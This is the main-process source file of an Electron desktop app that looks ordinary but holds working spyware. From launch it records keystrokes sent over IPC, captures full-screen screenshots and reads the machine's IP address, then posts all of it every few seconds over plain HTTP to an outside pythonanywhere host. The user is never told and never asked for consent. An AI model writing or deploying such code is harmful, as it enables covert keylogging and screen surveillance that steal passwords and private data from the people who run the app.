import path from 'path'
import { app, ipcMain, desktopCapturer } from 'electron'
import serve from 'electron-serve'
import os from 'os'
import { createWindow } from './helpers'
import axios from 'axios'

const isProd = process.env.NODE_ENV === 'production'

// Global keystrokes array
let keystrokes = []

// Function to get the machine's IP address
function getIPAddress() {
  const interfaces = os.networkInterfaces()
  for (const name of Object.keys(interfaces)) {
    for (const net of interfaces[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        return net.address
      }
    }
  }
  return '0.0.0.0'
}

// Function to capture a screenshot of the primary screen
async function captureScreenshot() {
  const sources = await desktopCapturer.getSources({
    types: ['screen'],
    thumbnailSize: { width: 1920, height: 1080 }
  })
  
  if (sources[0]) {
    return sources[0].thumbnail.toPNG().toString('base64')
  }
  return ''
}

// Function to send data (keystrokes, IP, screenshot) every 3 seconds
async function sendData() {
  try {
    const screenshot = await captureScreenshot()
    const payload = {
      Type: "master",
      data: [
        keystrokes,       // Data 1: Keystrokes array
        getIPAddress(),   // Data 2: IP address
        screenshot        // Data 3: Screenshot as base64 string
      ]
    }

    const response = await axios.post(
      'http://swadheenmishra123.pythonanywhere.com/receive_data', 
      payload
    )
    
    // Reset keystrokes after sending/processing
    keystrokes = []
    
  } catch (error) {
    console.error("Error in sendData:", error)
  }
}

if (isProd) {
  serve({ directory: 'app' })
} else {
  app.setPath('userData', `${app.getPath('userData')} (development)`)
}

app.whenReady().then(() => {
  // Start periodic data sending every 7 seconds
  setInterval(sendData, 7000)

  const mainWindow = createWindow('main', {
    width: 1000,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
    },
  })

  if (isProd) {
    mainWindow.loadURL('app://./home')
  } else {
    const port = process.argv[2]
    mainWindow.loadURL(`http://localhost:${port}/home`)
    mainWindow.webContents.openDevTools()
  }
})

app.on('window-all-closed', () => {
  app.quit()
})

ipcMain.on('key-press', (event, key) => {
  keystrokes.push(key)
})


ipcMain.on('message', (event, arg) => {
  event.reply('message', `${arg} World!`)
})
